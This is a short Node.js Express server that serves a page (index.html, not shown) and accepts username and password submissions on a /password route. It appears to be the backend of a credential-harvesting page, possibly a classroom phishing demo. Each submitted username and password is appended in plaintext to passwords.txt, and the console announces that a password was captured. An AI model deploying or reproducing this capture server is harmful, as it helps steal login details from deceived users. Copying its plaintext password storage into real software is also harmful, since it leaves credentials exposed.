
const path = require('path');
// Working with files
const fs = require('fs');

const express = require('express')
const app = express()

const bp = require('body-parser')
app.use(bp.json())
app.use(bp.urlencoded({ extended: true }))



app.get('/', (req, res) => {
    // Print message to the server side
    console.log('The client tried to enter a website.');
    // Response - return the HTML page 
    res.sendFile(path.join(__dirname, '/index.html'));
});



app.post('/password',  (req, res) => {
    // In POST request the information is in the body
    // The information in our case is the password that the client entered
    var password = req.body.password;
    var username = req.body.username;
    //Write the given password in the 'password.txt' file & Print a message in the server side
    fs.appendFileSync('passwords.txt', ` userName:${username} password : ${password} \n`);
    console.log(`The client enter password  \nYou can see this password in - passwords.txt`);
    
    res.send("done! you entered a password");
});





  

app.listen(8080, () => {
    console.log(`WebServer is up. Listening at http://localhost:8080`);
})